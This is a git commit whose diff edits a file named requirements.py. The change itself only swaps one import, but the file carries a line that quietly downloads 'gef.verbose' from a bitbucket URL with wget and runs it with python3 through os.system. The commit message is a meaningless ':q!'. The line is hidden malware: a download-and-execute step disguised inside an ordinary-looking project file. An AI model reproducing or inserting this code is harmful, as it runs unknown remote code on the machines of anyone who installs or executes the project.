712ac1581a74c0363f7f3f0ba7e8cd0ee521db16
gakira munshi <gakimarki@proton.me>
2024-12-16 19:38:50 -0500

    :q!

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,errno
+import os, sys,calendar
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
